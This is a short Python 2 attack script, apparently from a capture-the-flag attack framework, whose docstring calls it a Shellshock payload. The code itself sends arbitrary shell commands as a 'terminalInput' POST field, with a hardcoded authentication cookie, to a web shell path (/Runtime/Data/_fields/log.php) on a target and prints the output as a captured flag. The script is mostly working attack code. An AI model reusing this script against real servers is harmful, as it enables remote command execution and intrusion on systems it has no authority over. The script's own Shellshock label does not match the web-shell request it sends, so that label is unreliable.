#!/usr/bin/env python

from http import http
from config import *
from function import *
import urllib

'''
this is the payload script for vuln shellshock

'''


def attack(target,cmd,get_flag):
    is_vuln = 1
    flag = "hello world!"
    info = "success"
    reserve = 0    

    if check_shell(target,""):
	res = execute_shell(target,cmd)
    else:
	dump_warning(target,"check_shell failed","function.py check_shell")
	'''
	
	'''
	try:
	    headers  = {"Cookie":"pass=e4a1c38dd80b64d392d0d69ba46f58f9ee77c83d","User-agent":"aaa"}	   
	    cmd = urllib.unquote(cmd)
	    data = "terminalInput=%s"%cmd
	    data = data.replace('+','%2B')
	    print data 
	    res = http("post",target,target_port,"/Runtime/Data/_fields/log.php",data,headers)
	    print len(res)
	except Exception,e:
	    print e
	    dump_error(target,"attack failed","sample.py attack")
	    res = "error"

    if get_flag:
	if check_flag(res):
	    flag = res
	    print "flag => " + res.replace(" ","").replace("\n","")
	else:
	    dump_warning(target,"flag format error,you may need to rewrite the shell", "sample.py attack")
    elif res=="error":
	pass
    else:
	dump_success(target,"execution cmd","sample.py")
	if len(res)<1000:
    	    print res
	else:
	    print res[:200]


    print "testing ..........."
    return flag,is_vuln,info,reserve 




